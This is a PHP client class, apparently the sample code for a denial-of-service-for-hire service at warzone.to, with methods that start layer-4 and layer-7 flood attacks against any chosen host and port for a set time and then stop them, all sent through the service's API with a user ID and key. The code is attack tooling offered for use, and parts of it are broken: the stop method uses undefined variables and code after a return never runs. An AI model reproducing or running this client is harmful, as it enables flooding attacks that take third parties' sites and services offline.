<?php
/*
 *  WarZone.to PHP API cURL Example.
 *  
 *  @author  0din
 *  @link    https://warzone.to/
 *
*/

class API {

	/**
	* @param int $userID
	* @param string $key
	*/

	private $userID;
	private $key;   
	private $curl_handle = null;

	public function __construct($userID, $key){
		$this->userID = $userID;
		$this->apiKey = $key;
		try {
			if(empty($this->userID) || empty($this->apiKey)){
				throw new Exception('UserID and API Key must be defined.');
			}
		} catch (Exception $e) {
			exit($e->getMessage());
		}
	}

	public function __destruct() {
		if (!is_null($this->curl_handle)){
			curl_close($this->curl_handle);
		}
	}

	/**
	* @param string $host
	* @param int $port
	* @param int $time
	* @param string $method
	* @return string
	*/

	public function startL4($host, $port, $time, $method){
		$postdata = [
			'host' => $host,
			'port' => $port,
			'time' => $time,
			'method' => $method,
			'layer' => '4',
		];
		return $this->send($postdata, "start");
	}

	/**
	* @param string $host
	* @param int $time
	* @param string $method
	* @param string $requesttype
	* @param string $ratelimit
	* @return string
	*/

	public function startL7($host, $time, $method){
		$postdata = [
			'host' => $host,
			'time' => $time,
			'method' => $method,
			'layer' => '7',
		];
		return $this->send($postdata, "start");
	}

	/**
	* @param string $host
	* @return string
	*/

	public function stopAttack($host){
		$postdata = [
			'host' => $host,
			'time' => $time,
			'method' => $method,
		];
		return $this->send($postdata, "stop");
	}

	/**
	* @param array $parameters
	* @param string $action
	* @return string
	*/

	private function send(array $parameters = [], $action){
		$api_url = "https://api.warzone.to/" . $action . ".php";
		$parameters['user'] = $this->userID;
		$parameters['api_key'] = $this->apiKey;
		$parameters = http_build_query($parameters, '', '&');
		if(is_null($this->curl_handle)){
			$this->curl_handle = curl_init($api_url);
			curl_setopt($this->curl_handle, CURLOPT_RETURNTRANSFER, TRUE);
			curl_setopt($this->curl_handle, CURLOPT_ENCODING, "");
			curl_setopt($this->curl_handle, CURLOPT_MAXREDIRS, 10);
			curl_setopt($this->curl_handle, CURLOPT_HTTP_VERSION, CURL_HTTP_VERSION_1_1);
			curl_setopt($this->curl_handle, CURLOPT_POST, 1);
			curl_setopt($this->curl_handle, CURLOPT_POSTFIELDS, $parameters);
			curl_setopt($this->curl_handle, CURLOPT_HTTPHEADER , array("cache-control: no-cache", "content-type: application/x-www-form-urlencoded"));
		}
		switch($response = curl_exec($this->curl_handle)){
			case false:
				return curl_error($this->curl_handle);
			default:
				return $response;
				$response = json_decode($response, true);
				return $response;
		}
	}
}

?>
